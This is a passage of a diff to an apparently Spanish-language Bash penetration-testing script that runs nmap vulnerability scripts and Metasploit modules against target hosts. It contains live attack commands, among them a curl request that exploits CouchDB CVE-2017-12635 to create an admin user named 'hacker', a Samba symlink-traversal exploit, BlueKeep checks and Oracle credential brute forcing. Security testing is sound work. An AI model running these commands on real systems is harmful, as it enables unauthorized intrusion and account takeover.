-			grep "rootfs" logs/vulnerabilidades/"$ip"_"$port"_symlinkTraversal.txt | egrep -v "exploits|payloads|evasion|cowsay" | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  > .vulnerabilidades/"$ip"_"$port"_symlinkTraversal.txt
+			echo "Probando samba_symlink_traversal con ($writable_shared)"
+			msfconsole -x "use admin/smb/samba_symlink_traversal;set SMBSHARE '$writable_shared';set RHOSTS $ip;exploit;exit" > logs/vulnerabilidades/"$ip"_445_symlinkTraversal.txt 2>/dev/null
+			grep "rootfs" logs/vulnerabilidades/"$ip"_445_symlinkTraversal.txt | egrep -v "exploits|payloads|evasion|cowsay" | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  > .vulnerabilidades/"$ip"_445_symlinkTraversal.txt
 			#######################		
 		fi		
 
@@ -2293,7 +2312,7 @@ then
 			echo -e "\t[+] Probando vulnerabilidad cipher-zero"
 			echo "nmap -sU --script ipmi-cipher-zero -p 623 -Pn -n $ip"  > logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 2>/dev/null 
 			nmap -sU --script ipmi-cipher-zero -p $port -Pn -n $ip >> logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 2>/dev/null 
-			grep "|" logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|filtered" > .vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 	
+			grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 	
 			
 			#exploit
 			#ipmitool -I lanplus -C 0 -H 192.168.200.5 -U admin -P root user list 
@@ -2320,7 +2339,7 @@ then
 		echo -e "[+] Escaneando $ip:$port"
 		echo "nmap -n -sT -sV -p $port -Pn --script=mongodb-databases,mongodb-info $ip"  > logs/vulnerabilidades/"$ip"_mongo_info.txt 2>/dev/null 
 		nmap -n -sT -sV -p $port -Pn --script=mongodb-databases $ip  >> logs/vulnerabilidades/"$ip"_mongo_info.txt 2>/dev/null 
-		grep "|" logs/vulnerabilidades/"$ip"_mongo_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_mongo_info.txt 				
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_mongo_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$ip"_mongo_info.txt 				
 	done	
 	#insert clean data	
 	insert_data	
@@ -2336,7 +2355,7 @@ then
 		echo -e "[+] Escaneando $ip:$port"
 		echo "nmap -Pn -n -sV -p $port --script=couchdb-databases,couchdb-stats $ip" >> logs/vulnerabilidades/"$ip"_mongo_info.txt 2>/dev/null
 		nmap -Pn -n -sV -p $port --script=couchdb-databases $ip >> logs/vulnerabilidades/"$ip"_mongo_info.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_mongo_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_mongo_info.txt
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_mongo_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$ip"_mongo_info.txt
 
 		#CVE-2017-12635
 		curl -X PUT -d '{"type":"user","name":"hacker","roles":["_admin"],"roles":[],"password":"hacker"}' $ip:$port/_users/org.couchdb.user:hacker -H "Content-Type:application/json" > logs/vulnerabilidades/"$ip"_"$port"_privEsc.txt
@@ -2359,7 +2378,7 @@ then
 		echo -e "[+] Escaneando $ip:$port"		
 		echo "nmap -Pn -n $ip --script=x11-access.nse" > logs/vulnerabilidades/"$ip"_"$port"_x11Access.txt 2>/dev/null 
 		nmap -Pn -n $ip --script=x11-access.nse >> logs/vulnerabilidades/"$ip"_"$port"_x11Access.txt 2>/dev/null 
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_x11Access.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_x11Access.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_x11Access.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$ip"_"$port"_x11Access.txt 
 
 		#xdpyinfo -display <ip>:<display>
 		#xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
@@ -2380,11 +2399,11 @@ then
 		echo -e "[+] Escaneando $ip:$port"		
 		echo "nmap -Pn -n -sT -p $port $ip --script=nfs-ls.nse" > logs/vulnerabilidades/"$ip"_"$port"_compartidoNFS.txt 2>/dev/null 
 		nmap -Pn -n -p $port $ip --script=nfs-ls.nse >> logs/vulnerabilidades/"$ip"_"$port"_compartidoNFS.txt 2>/dev/null 
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_compartidoNFS.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_compartidoNFS.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_compartidoNFS.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$ip"_"$port"_compartidoNFS.txt 
 		
 		echo "nmap -n -sT -p $port $ip --script=rpcinfo" > logs/enumeracion/"$ip"_"$port"_NFSinfo.txt 2>/dev/null 
 		nmap -Pn -n -p $port $ip --script=rpcinfo >> logs/enumeracion/"$ip"_"$port"_NFSinfo.txt 2>/dev/null 
-		grep "|" logs/enumeracion/"$ip"_"$port"_NFSinfo.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .enumeracion/"$ip"_"$port"_NFSinfo.txt
+		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_NFSinfo.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .enumeracion/"$ip"_"$port"_NFSinfo.txt
 
 		rusers -l $ip > logs/enumeracion/"$ip"_"$port"_rusers.txt 2>/dev/null
 		egrep "console|tty" logs/enumeracion/"$ip"_"$port"_rusers.txt > .enumeracion/"$ip"_"$port"_rusers.txt
@@ -2408,7 +2427,7 @@ then
 		echo -e "[+] Escaneando $ip:$port"		
 		echo "nmap -Pn -n -sT -p $port --script=msrpc-enum $ip" > logs/enumeracion/"$ip"_"$port"_msrpc.txt 2>/dev/null 
 		nmap -Pn -n -p $port --script=msrpc-enum $ip>> logs/enumeracion/"$ip"_"$port"_msrpc.txt 2>/dev/null 
-		grep "|" logs/enumeracion/"$ip"_"$port"_msrpc.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .enumeracion/"$ip"_"$port"_msrpc.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_msrpc.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .enumeracion/"$ip"_"$port"_msrpc.txt 
 				
 	done	
 	insert_data	
@@ -2454,7 +2473,7 @@ then
 		echo -e "[+] Escaneando $ip:$port"			
 		echo "nmap -n -sT -p $port $ip --script redis-info" > logs/enumeracion/"$ip"_redis_info.txt 2>/dev/null
 		nmap -Pn -n -p $port $ip --script redis-info >> logs/enumeracion/"$ip"_redis_info.txt 2>/dev/null
-		grep "|" logs/enumeracion/"$ip"_redis_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR"  > .enumeracion/"$ip"_redis_info.txt						
+		grep --color=never "|" logs/enumeracion/"$ip"_redis_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered"  > .enumeracion/"$ip"_redis_info.txt						
 		#A exploit for Redis(<=5.0.5) RCE redis-exploit.sh
 
 		echo "redis-cli -h $ip config get '*'" > logs/enumeracion/"$ip"_redis_config.txt 2>/dev/null
@@ -2498,7 +2517,7 @@ then
 		echo -e "[+] Nmap vulnerabilities"
 		echo "nmap -Pn -n -p $port --script rmi-vuln-classloader $ip" > logs/vulnerabilidades/"$ip"_"$port"_rmiVuln.txt 2>/dev/null
 		nmap -Pn -n -p $port --script rmi-vuln-classloader $ip>> logs/vulnerabilidades/"$ip"_"$port"_rmiVuln.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_rmiVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_rmiVuln.txt
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_rmiVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$ip"_"$port"_rmiVuln.txt
 
 		echo -e "[+] rmg vulnerabilities"
 		rmg.sh enum $ip $port > logs/vulnerabilidades/"$ip"_"$port"_rmiVuln2.txt
@@ -2529,7 +2548,7 @@ then
 	
 	echo "nmap -n -sT -p $port --script=telnet-ntlm-info.nse $ip" > logs/enumeracion/"$ip"_"$port"_telnetInfo.txt 2>/dev/null
 	nmap -Pn -n -sT -p $port --script=telnet-ntlm-info.nse $ip >> logs/enumeracion/"$ip"_"$port"_telnetInfo.txt 2>/dev/null
-	grep "|" logs/enumeracion/"$ip"_"$port"_telnetInfo.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" >> .enumeracion/"$ip"_"$port"_telnetInfo.txt
+	grep --color=never "|" logs/enumeracion/"$ip"_"$port"_telnetInfo.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" >> .enumeracion/"$ip"_"$port"_telnetInfo.txt
 	
 	
 	echo -e "\t[+] Probando passwords"	
@@ -2758,14 +2777,14 @@ then
 		echo -e "\t[+] Verificando info VNC"
 		echo "nmap -n -Pn -sT -p $port --script vnc-info,vnc-title $ip" > logs/enumeracion/"$ip"_"$port"_info.txt 2>/dev/null
 		nmap -Pn -n -p $port --script vnc-info,realvnc-auth-bypass,vnc-title $ip >> logs/enumeracion/"$ip"_"$port"_info.txt 2>/dev/null
-		grep "|" logs/enumeracion/"$ip"_"$port"_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" >> .enumeracion/"$ip"_"$port"_info.txt
-		grep -i "server does not require authentication" logs/enumeracion/"$ip"_"$port"_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" >> .vulnerabilidades/"$ip"_"$port"_noauth.txt
+		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" >> .enumeracion/"$ip"_"$port"_info.txt
+		grep -i "server does not require authentication" logs/enumeracion/"$ip"_"$port"_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" >> .vulnerabilidades/"$ip"_"$port"_noauth.txt
 
 
 		echo -e "\t[+] Verificando Vulnerabilidad de REALVNC"
 		echo "nmap -n -Pn -sT -p $port --script realvnc-auth-bypass $ip" > logs/vulnerabilidades/"$ip"_vnc_bypass.txt 2>/dev/null
 		nmap -Pn -n -p $port --script realvnc-auth-bypass $ip >> logs/vulnerabilidades/"$ip"_vnc_bypass.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_vnc_bypass.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" >> .vulnerabilidades/"$ip"_vnc_bypass.txt
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_vnc_bypass.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" >> .vulnerabilidades/"$ip"_vnc_bypass.txt
 
 		#vncpwd <vnc password file>
 
@@ -2789,7 +2808,7 @@ then
 		echo -e "\t[+] Obteniendo información de MS-SQL"
 		echo "nmap -Pn -n -sV -p 1433 --host-timeout 10s --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER  $ip" >> logs/enumeracion/"$ip"_1434_info.txt  2>/dev/null
 		nmap -Pn -n -sV -p 1433 --host-timeout 10s --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER  $ip >> logs/enumeracion/"$ip"_1434_info.txt  2>/dev/null
-		grep "|" logs/enumeracion/"$ip"_1434_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .enumeracion/"$ip"_1434_info.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_1434_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .enumeracion/"$ip"_1434_info.txt 
 					
 		echo ""
  	done <servicios/mssql.txt
@@ -2817,8 +2836,8 @@ then
 		nmap -Pn -n -sT -sU --script=citrix-enum-apps -p 1604 $ip >> logs/enumeracion/"$ip"_1604_citrixApp.txt 2>/dev/null
 		nmap -Pn -n -sT -sU --script=citrix-enum-servers -p 1604  $ip >> logs/enumeracion/"$ip"_1604_citrixServers.txt 2>/dev/null
 		
-		grep "|" logs/enumeracion/"$ip"_1604_citrixApp.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|filtered" > .enumeracion/"$ip"_1604_citrixApp.txt 
-		grep "|" logs/enumeracion/"$ip"_1604_citrixServers.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|filtered" > .enumeracion/"$ip"_1604_citrixServers.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_1604_citrixApp.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|filtered" > .enumeracion/"$ip"_1604_citrixApp.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_1604_citrixServers.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|filtered" > .enumeracion/"$ip"_1604_citrixServers.txt 
 													 
 		 echo ""
  	done <servicios/citrix.txt
@@ -2930,15 +2949,15 @@ then
 		echo -e "\t[+] Probando vulnerabilidad con nmap"				
 		echo "nmap --script oracle-brute -p $port --script-args oracle-brute.sid=ORCL $ip" > logs/vulnerabilidades/"$ip"_"$port"_oracleCreds.txt 2>/dev/null
 		nmap -n -Pn --script oracle-brute -p $port --script-args oracle-brute.sid=ORCL $ip >> logs/vulnerabilidades/"$ip"_"$port"_oracleCreds.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_oracleCreds.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_oracleCreds.txt	
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_oracleCreds.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$ip"_"$port"_oracleCreds.txt	
 
 		echo "nmap -p $port --script=oracle-sid-brute $ip" > logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt 2>/dev/null
 		nmap -n -Pn -p $port --script=oracle-sid-brute $ip >> logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_oracleSids.txt	
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$ip"_"$port"_oracleSids.txt	
 
 		echo "nmap -p $port --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n $ip" > logs/vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 2>/dev/null
 		nmap -Pn -p $port --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n $ip >> logs/vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 
 	
 	
 		echo -e "\t[+] Probando vulnerabilidad con tnscmd10g"				
@@ -2981,7 +3000,7 @@ then
 		echo -e "\t[+] Probando vulnerabilidad"				
 		echo "nmap -n -sT -p $port --script http-vuln-cve2017-5689 $ip" > logs/vulnerabilidades/"$ip"_"$port"_intelVuln.txt 2>/dev/null
 		nmap -Pn -n -sT -p $port --script http-vuln-cve2017-5689 $ip >> logs/vulnerabilidades/"$ip"_"$port"_intelVuln.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_intelVuln.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_"$port"_intelVuln.txt
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_intelVuln.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$ip"_"$port"_intelVuln.txt
 													 
 		 echo ""
  	done <servicios/intel.txt	
@@ -3907,7 +3926,7 @@ if [ -f servicios/smtp.txt ]
 			# Vulnerabilidades
 			echo "nmap -Pn --script=smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1764 -p $port $ip" > logs/vulnerabilidades/"$ip"_"$port"_smtpVuln.txt 2>/dev/null
 			nmap -n -Pn --script=smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1764 -p $port $ip>> logs/vulnerabilidades/"$ip"_"$port"_smtpVuln.txt 2>/dev/null
-			grep "|" logs/vulnerabilidades/"$ip"_"$port"_smtpVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT VULNERABLE|cve2010-4344" > .vulnerabilidades/"$ip"_"$port"_smtpVuln.txt
+			grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_smtpVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT VULNERABLE|cve2010-4344" > .vulnerabilidades/"$ip"_"$port"_smtpVuln.txt
 
 			
 			########## open relay #######
@@ -3999,14 +4018,14 @@ then
 	
 			echo "nmap -Pn -p $port --script rdp-ntlm-info $ip"  > logs/enumeracion/"$ip"_"$port"_rdpInfo.txt 2>/dev/null
 			nmap -n -Pn -p $port --script rdp-ntlm-info $ip >> logs/enumeracion/"$ip"_"$port"_rdpInfo.txt 2>/dev/null
-			grep "|" logs/enumeracion/"$ip"_"$port"_rdpInfo.txt  | egrep -iv "ACCESS_DENIED|falseCould|ERROR" > .enumeracion/"$ip"_"$port"_rdpInfo.txt
+			grep --color=never "|" logs/enumeracion/"$ip"_"$port"_rdpInfo.txt   | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .enumeracion/"$ip"_"$port"_rdpInfo.txt
 
 
 			echo -e "\t\t[+] Revisando vulnerabilidad blueKeep"			
 			kernel=`uname -a`
 			#if [[ $kernel == *"x86_64"* ]]; then #no es rasberry
 			if [[ $kernel == *"x86_64"* || $kernel == *"i686"* ]]; then #no es rasberry
-				blueKeep $ip >> logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt
+				blueKeep $ip >> logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt 2>/dev/null
 				grep "VULNERABLE" logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt  > .vulnerabilidades/"$ip"_3389_BlueKeep.txt
 			else # es rasberry
 				msfconsole -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep;set RHOSTS $ip;exploit;exit" > logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt
@@ -4016,7 +4035,7 @@ then
 			
 			echo -e "\t\t[+] Revisando vulnerabilidad MS12-020"
 			nmap -n -sV -Pn --script=rdp-vuln-ms12-020 -p 3389 $ip > logs/vulnerabilidades/"$ip"_3389_ms12020.txt
-			grep "|" logs/vulnerabilidades/"$ip"_3389_ms12020.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$ip"_3389_ms12020.txt
+			grep --color=never "|" logs/vulnerabilidades/"$ip"_3389_ms12020.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$ip"_3389_ms12020.txt
 			
 			while true; do
 				free_ram=`free -m | grep -i mem | awk '{print $7}'`
@@ -4066,7 +4085,7 @@ then
 		
 		echo -e "[+] Escaneando vulnerabilidades $ip:$port"		
 		nmap -n -Pn -sU -p 69 --script tftp-enum.nse $ip  > logs/enumeracion/"$ip"_"$port"_tftp_enum.txt  2>/dev/null
-		grep "|" logs/enumeracion/"$ip"_"$port"_tftp_enum.txt | grep -v "filtered" > .enumeracion/"$ip"_"$port"_tftp_enum.txt	
+		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_tftp_enum.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .enumeracion/"$ip"_"$port"_tftp_enum.txt	
 				
 	done		
 	
@@ -4101,7 +4120,7 @@ then
 		
 		echo -e "[+] Escaneando vulnerabilidades $ip:$port"		
 		nmap -n -sT -sV -Pn -p $port $ip --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp_vuln-cve2010-4221 > logs/vulnerabilidades/"$ip"_"$port"_ftp_vuln.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_ftp_vuln.txt > .vulnerabilidades/"$ip"_"$port"_ftp_vuln.txt	
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_ftp_vuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$ip"_"$port"_ftp_vuln.txt	
 		
 		echo -e "\t[+] Obtener banner"	
 		echo -e "\tLIST" | nc -w 3 $ip $port > .banners/"$ip"_"$port".txt 2>/dev/null 
@@ -4156,13 +4175,13 @@ then
 					
 				echo "nmap -sV -p $port --script http-shellshock.nse --script-args uri=$path $ip" >> logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt
 				nmap -n -Pn -sV -p $port --script http-shellshock.nse --script-args uri=$path $ip >> logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt
-				grep "|" logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED|http-server-header|Problem" > .vulnerabilidades/"$ip"_"$port"_shellshock.txt	
+				grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|http-server-header|Problem" > .vulnerabilidades/"$ip"_"$port"_shellshock.txt	
 				
 				if [ -s .vulnerabilidades/"$ip"_"$port"_shellshock.txt ] # if FILE exists and has a size greater than zero.
 				then
 					echo -e "\t$OKRED[!] Vulnerable a Shellsock \n $RESET" 
 					echo -e "\t\n URL: http://$ip$path \n"  > .vulnerabilidades/"$ip"_"$port"_shellshock.txt
-					grep "|" logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" >> .vulnerabilidades/"$ip"_"$port"_shellshock.txt	
+					grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" >> .vulnerabilidades/"$ip"_"$port"_shellshock.txt	
 				else				
 					echo -e "\t$OKGREEN[i] No vulnerable a Shellsock $RESET"
 				fi
@@ -4441,10 +4460,10 @@ then
 		echo -e "\t[+]Probando vulnerabilidad de Cisco ASA \n $RESET"
 		echo "nmap -n -sT -Pn  -p 443 --script http-vuln-cve2014-2128 $ip" > logs/vulnerabilidades/"$ip"_"$port"_ciscoASAVuln.txt 2>/dev/null		
 		nmap -n -sT -Pn  -p 443 --script http-vuln-cve2014-2128 $ip >> logs/vulnerabilidades/"$ip"_"$port"_ciscoASAVuln.txt 2>/dev/null		
-		grep "|" logs/vulnerabilidades/"$ip"_"$port"_ciscoASAVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$ip"_"$port"_ciscoASAVuln.txt
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_ciscoASAVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$ip"_"$port"_ciscoASAVuln.txt
 		
 #		nmap -n -sT -Pn  -p 443 --script http_vuln-cve2014-2129 $ip > logs/vulnerabilidades/"$ip"_cisco-dos.txt 2>/dev/null		
-		#grep "|" logs/vulnerabilidades/"$ip"_cisco-dos.txt  > .vulnerabilidades/"$ip"_cisco-dos.txt
+		#grep --color=never "|" logs/vulnerabilidades/"$ip"_cisco-dos.txt  > .vulnerabilidades/"$ip"_cisco-dos.txt
 													 
 		 echo ""
  	done <servicios/ciscoASA.txt
@@ -4506,7 +4525,7 @@ then
 		echo -e "[+] Escaneando $ip:445"		
 		echo "nmap -n -sT -Pn --script smb-vuln-cve-2017-7494 -p 445 $ip" > logs/vulnerabilidades/"$ip"_445_sambaVuln.txt 2>/dev/null
 		nmap -n -sT -Pn --script smb-vuln-cve-2017-7494 -p 445 $ip >> logs/vulnerabilidades/"$ip"_445_sambaVuln.txt 2>/dev/null
-		grep "|" logs/vulnerabilidades/"$ip"_445_sambaVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$ip"_445_sambaVuln.txt
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_sambaVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered" > .vulnerabilidades/"$ip"_445_sambaVuln.txt
 
 		echo -e "\t[+] Obteniendo version de samba"
 		msfconsole -x "use auxiliary/scanner/smb/smb_version;set RHOSTS $ip; exploit;exit" >> logs/enumeracion/"$ip"_samba_version.txt 2>/dev/null
@@ -5304,7 +5323,7 @@ for line in $(cat .enumeracion2/*webdirectorios.txt 2>/dev/null); do
 				ip=`echo $ip_port | cut -d ":" -f 1` #puede ser subdominio tb
 				port=`echo $ip_port | cut -d ":" -f 2`		
 			
-					if [[ (${path} != *"xmlrpc"* && ${path} != *"manual"* && ${path} != *"dashboard"* && ${path} != *"docs"* && ${path} != *"manual"* && ${path} != *"manual"* && ${path} != *"manual"*  && ${path} != *"manual"*  && ${path} != *"manual"* && ${path} != *"manual"* && ${path} != *"manual"* ) ]];then 
+					if [[ (${path} != *"xmlrpc"* && ${path} != *"manual"* && ${path} != *"dashboard"* && ${path} != *"docs"* && ${path} != *"license"* && ${path} != *"wp"* && ${path} != *"manual"*  && ${path} != *"manual"*  && ${path} != *"manual"* && ${path} != *"manual"* && ${path} != *"manual"* ) ]];then 
 					echo -e "\t\t[+] Enumerando directorios de 2do nivel ($path)" 
 					web-buster.pl -t $ip -p $port -s $proto -h $hilos_web -d "/$path/" -m folders >> logs/enumeracion/"$ip"_"$port"_webdirectorios2.txt &
 										
@@ -5776,12 +5795,12 @@ fi
 #archivos php
 if [ -f servicios/web.txt ]
 then      
-    echo -e "$OKBLUE #################### WEB PHP(`wc -l servicios/web.txt`) ######################$RESET"	    
+    echo -e "$OKBLUE #################### WEB extense(`wc -l servicios/web.txt`) ######################$RESET"	    
     for line in $(cat servicios/web.txt); do  
 		host=`echo $line | cut -f1 -d":"`
 		port=`echo $line | cut -f2 -d":"`		
 		
-        ######## revisar por dominio #######
+        ######## domain check #######
         if grep -q "," "$prefijo$IP_LIST_FILE" 2>/dev/null; then			
 	        lista_subdominios=`grep $ip $prefijo$IP_LIST_FILE | egrep 'subdomain|vhost'| cut -d "," -f2 | grep --color=never $DOMINIO_INTERNO`
 	        for subdominio in $lista_subdominios; do	
@@ -5791,7 +5810,7 @@ then
 			greprc=$?
 			if [[ $greprc -eq 0  ]];then # si el banner es Apache																							
 				echo -e "\t\t[+] Revisando archivos php ($host - Apache/nginx)"
-				web-buster.pl -t $host -p $port -h $hilos_web -d / -m php -s $proto -q 1 | egrep --color=never "^200" > .enumeracion/"$host"_"$port"_webarchivos.txt &
+				web-buster.pl -t $host -p $port -h $hilos_web -d / -m extended -s $proto -q 1 | egrep --color=never "^200" > .enumeracion/"$host"_"$port"_extended.txt &
 				sleep 1
 			else
 				echo -e "\t\t[+] No es Apache o no debemos escanear"
@@ -5802,17 +5821,17 @@ then
 	        done
         fi
     
-	###  if the server is apache ######
